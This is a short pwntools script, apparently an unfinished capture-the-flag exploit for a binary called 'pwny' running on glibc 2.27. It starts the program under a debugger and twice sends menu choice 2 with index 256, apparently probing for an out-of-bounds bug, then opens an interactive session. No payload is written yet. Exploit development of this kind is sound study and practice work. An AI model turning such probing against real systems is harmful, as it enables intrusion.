from pwn import *
from pwn.toplevel import process, ELF
context.log_level = 'debug'
context.terminal = ('open-wsl.exe', '-e')
# io = process("./pwny", env={"LD_PRELOAD": "./ld-2.27.so:./libc-2.27.so"})
io = gdb.debug("./pwny")
elf = ELF("./pwny")
libc = ELF("./libc-2.27.so")

io.sendlineafter("choice: ", "2")
io.sendlineafter("Index: ", "256")
io.sendlineafter("choice: ", "2")
io.sendlineafter("Index: ", "256")



io.interactive()
